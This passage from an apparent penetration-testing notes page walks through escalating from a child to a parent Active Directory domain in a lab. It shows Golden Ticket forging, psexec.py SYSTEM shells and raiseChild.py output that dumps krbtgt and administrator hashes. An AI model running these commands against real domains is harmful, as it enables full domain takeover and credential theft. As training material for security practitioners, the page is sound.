+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>Impacket<span class="w"> </span>v0.9.25.dev1+20220311.121550.1271d369<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>basic<span class="w"> </span>skeleton<span class="w"> </span>ticket<span class="w"> </span>and<span class="w"> </span>PAC<span class="w"> </span>Infos
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Customizing<span class="w"> </span>ticket<span class="w"> </span><span class="k">for</span><span class="w"> </span>INTERNAL.TRUSTED.LOCAL/hacker
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_LOGON_INFO
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_CLIENT_INFO_TYPE
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTicketPart
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncAsRepPart
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Signing/Encrypting<span class="w"> </span>final<span class="w"> </span>ticket
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_SERVER_CHECKSUM
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_PRIVSVR_CHECKSUM
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTicketPart
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncASRepPart
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>hacker.ccache
+</span></code></pre></div>
+<p>The ticket will be saved down to our system as a <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">credential cache (ccache)</a> file, which is a file used to hold Kerberos credentials. Setting the <code>KRB5CCNAME</code> environment variable tells the system to use this file for Kerberos authentication attempts.</p>
+<h3 id="setting-the-krb5ccname-environment-variable">Setting the KRB5CCNAME Environment Variable</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>❯<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>hacker.ccache<span class="w"> </span>
+</span></code></pre></div>
+<p>We can check if we can successfully authenticate to the parent domain's Domain Controller using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">Impacket's version of Psexec</a>. If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.</p>
+<h3 id="getting-a-system-shell-using-impackets-psexecpy">Getting a SYSTEM shell using Impacket's psexec.py</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>❯<span class="w"> </span>psexec.py<span class="w"> </span>INTERNAL.TRUSTED.LOCAL/hacker@dc01.trusted.local<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-target-ip<span class="w"> </span><span class="m">172</span>.16.5.5
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>Impacket<span class="w"> </span>v0.9.25.dev1+20220311.121550.1271d369<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>shares<span class="w"> </span>on<span class="w"> </span><span class="m">172</span>.16.5.5.....
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>writable<span class="w"> </span>share<span class="w"> </span>ADMIN$
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Uploading<span class="w"> </span>file<span class="w"> </span>nkYjGWDZ.exe
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Opening<span class="w"> </span>SVCManager<span class="w"> </span>on<span class="w"> </span><span class="m">172</span>.16.5.5.....
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>service<span class="w"> </span>eTCU<span class="w"> </span>on<span class="w"> </span><span class="m">172</span>.16.5.5.....
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>service<span class="w"> </span>eTCU.....
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Press<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>extra<span class="w"> </span>shell<span class="w"> </span>commands
+</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Version<span class="w"> </span><span class="m">10</span>.0.17763.107<span class="o">]</span>
+</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2018</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>All<span class="w"> </span>rights<span class="w"> </span>reserved.
+</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>
+</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;<span class="w"> </span>whoami
+</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>nt<span class="w"> </span>authority<span class="se">\s</span>ystem
+</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>
+</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;<span class="w"> </span>hostname
+</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>DC01
+</span></code></pre></div>
+<p>Impacket also has the tool <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py">raiseChild.py</a>, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:</p>
+<ul>
+<li>Obtains the SID for the Enterprise Admins group of the parent domain</li>
+<li>Retrieves the hash for the KRBTGT account in the child domain</li>
+<li>Creates a Golden Ticket</li>
+<li>Logs into the parent domain</li>
+<li>Retrieves credentials for the Administrator account in the parent domain</li>
+</ul>
+<p>Finally, if the <code>target-exec</code> switch is specified, it authenticates to the parent domain's Domain Controller via Psexec</p>
+<h3 id="performing-the-attack-with-raisechildpy">Performing the Attack with raiseChild.py</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>❯<span class="w"> </span>raiseChild.py<span class="w"> </span>-target-exec<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>INTERNAL.TRUSTED.LOCAL/Administrator
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>Impacket<span class="w"> </span>v0.9.25.dev1+20220311.121550.1271d369<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>Password:
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Raising<span class="w"> </span>child<span class="w"> </span>domain<span class="w"> </span>INTERNAL.TRUSTED.LOCAL
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Forest<span class="w"> </span>FQDN<span class="w"> </span>is:<span class="w"> </span>TRUSTED.LOCAL
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Raising<span class="w"> </span>INTERNAL.TRUSTED.LOCAL<span class="w"> </span>to<span class="w"> </span>TRUSTED.LOCAL
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>TRUSTED.LOCAL<span class="w"> </span>Enterprise<span class="w"> </span>Admin<span class="w"> </span>SID<span class="w"> </span>is:<span class="w"> </span>S-1-5-21-3842939050-3880317879-2865463114-519
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Getting<span class="w"> </span>credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span>INTERNAL.TRUSTED.LOCAL
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>INTERNAL.TRUSTED.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>INTERNAL.TRUSTED.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Getting<span class="w"> </span>credentials<span class="w"> </span><span class="k">for</span><span class="w"> </span>TRUSTED.LOCAL
+</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>TRUSTED.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+</span><span id="__span-20-15"><a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>TRUSTED.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
+</span><span id="__span-20-16"><a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Target<span class="w"> </span>User<span class="w"> </span>account<span class="w"> </span>name<span class="w"> </span>is<span class="w"> </span>administrator
+</span><span id="__span-20-17"><a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>TRUSTED.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+</span><span id="__span-20-18"><a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>TRUSTED.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+</span><span id="__span-20-19"><a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Opening<span class="w"> </span>PSEXEC<span class="w"> </span>shell<span class="w"> </span>at<span class="w"> </span>DC01.TRUSTED.LOCAL
+</span><span id="__span-20-20"><a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>shares<span class="w"> </span>on<span class="w"> </span>DC01.TRUSTED.LOCAL.....
+</span><span id="__span-20-21"><a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>writable<span class="w"> </span>share<span class="w"> </span>ADMIN$
+</span><span id="__span-20-22"><a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Uploading<span class="w"> </span>file<span class="w"> </span>BnEGssCE.exe
+</span><span id="__span-20-23"><a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Opening<span class="w"> </span>SVCManager<span class="w"> </span>on<span class="w"> </span>DC01.TRUSTED.LOCAL.....
+</span><span id="__span-20-24"><a id="__codelineno-20-24" name="__codelineno-20-24" href="#__codelineno-20-24"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>service<span class="w"> </span>UVNb<span class="w"> </span>on<span class="w"> </span>DC01.TRUSTED.LOCAL.....
+</span><span id="__span-20-25"><a id="__codelineno-20-25" name="__codelineno-20-25" href="#__codelineno-20-25"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>service<span class="w"> </span>UVNb.....
+</span><span id="__span-20-26"><a id="__codelineno-20-26" name="__codelineno-20-26" href="#__codelineno-20-26"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Press<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>extra<span class="w"> </span>shell<span class="w"> </span>commands
+</span><span id="__span-20-27"><a id="__codelineno-20-27" name="__codelineno-20-27" href="#__codelineno-20-27"></a>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Version<span class="w"> </span><span class="m">10</span>.0.17763.107<span class="o">]</span>
+</span><span id="__span-20-28"><a id="__codelineno-20-28" name="__codelineno-20-28" href="#__codelineno-20-28"></a><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2018</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>All<span class="w"> </span>rights<span class="w"> </span>reserved.
+</span><span id="__span-20-29"><a id="__codelineno-20-29" name="__codelineno-20-29" href="#__codelineno-20-29"></a>
+</span><span id="__span-20-30"><a id="__codelineno-20-30" name="__codelineno-20-30" href="#__codelineno-20-30"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+</span><span id="__span-20-31"><a id="__codelineno-20-31" name="__codelineno-20-31" href="#__codelineno-20-31"></a>nt<span class="w"> </span>authority<span class="se">\s</span>ystem
+</span><span id="__span-20-32"><a id="__codelineno-20-32" name="__codelineno-20-32" href="#__codelineno-20-32"></a>
+</span><span id="__span-20-33"><a id="__codelineno-20-33" name="__codelineno-20-33" href="#__codelineno-20-33"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;exit
+</span><span id="__span-20-34"><a id="__codelineno-20-34" name="__codelineno-20-34" href="#__codelineno-20-34"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Process<span class="w"> </span>cmd.exe<span class="w"> </span>finished<span class="w"> </span>with<span class="w"> </span>ErrorCode:<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>ReturnCode:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-20-35"><a id="__codelineno-20-35" name="__codelineno-20-35" href="#__codelineno-20-35"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Opening<span class="w"> </span>SVCManager<span class="w"> </span>on<span class="w"> </span>DC01.TRUSTED.LOCAL.....
+</span><span id="__span-20-36"><a id="__codelineno-20-36" name="__codelineno-20-36" href="#__codelineno-20-36"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Stopping<span class="w"> </span>service<span class="w"> </span>UVNb.....
+</span><span id="__span-20-37"><a id="__codelineno-20-37" name="__codelineno-20-37" href="#__codelineno-20-37"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Removing<span class="w"> </span>service<span class="w"> </span>UVNb.....
+</span><span id="__span-20-38"><a id="__codelineno-20-38" name="__codelineno-20-38" href="#__codelineno-20-38"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Removing<span class="w"> </span>file<span class="w"> </span>BnEGssCE.exe.....
+</span></code></pre></div>
+<p>The script lists out the workflow and process in a comment as follows:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1">#   The workflow is as follows:</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="c1">#       Input:</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c1">#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of &#39;domain/username[:password]&#39;</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1">#              The domain specified MUST be the domain FQDN.</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="c1">#           2) Optionally a pathname to save the generated golden ticket (-w switch)</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="c1">#           3) Optionally a target-user RID to get credentials (-targetRID switch)</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="c1">#              Administrator by default.</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="c1">#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="c1">#              Enterprise Admin by default.</span>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="c1">#</span>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="c1">#       Process:</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="c1">#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])</span>
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="c1">#           2) Find out what the forest FQDN is (via [MS-NRPC])</span>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="c1">#           3) Get the forest&#39;s Enterprise Admin SID (via [MS-LSAT])</span>
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="c1">#           4) Get the child domain&#39;s krbtgt credentials (via [MS-DRSR])</span>
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="c1">#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO&#39;s ExtraSids array</span>
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="c1">#              and setting expiration 10 years from now</span>
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a><span class="c1">#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)</span>
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="c1">#           7) If file was specified, save the golden ticket in ccache format</span>
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a><span class="c1">#           8) If target was specified, a PSEXEC shell is launched</span>
+</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="c1">#</span>
+</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a><span class="c1">#       Output:</span>
+</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a><span class="c1">#           1) Target user credentials (Forest&#39;s krbtgt/admin credentials by default)</span>
+</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a><span class="c1">#           2) A golden ticket saved in ccache for future fun and profit</span>
+</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a><span class="c1">#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec</span>
+</span><span id="__span-21-26"><a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a><span class="c1">#              parameter.</span>
+</span></code></pre></div>
+<p>Though tools such as <code>raiseChild.py</code> can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should <strong><code>always</code></strong> be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="Previous: Attacking Domain Trusts">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256l137.3-137.4c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Attacking Domain Trusts
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../linux/" class="md-footer__link md-footer__link--next" aria-label="Next: Linux">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Linux
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/0xbara" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://x.com/0xbara" target="_blank" rel="noopener" title="x.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://hackerone.com/0xbara" target="_blank" rel="noopener" title="hackerone.com" class="md-social__link">
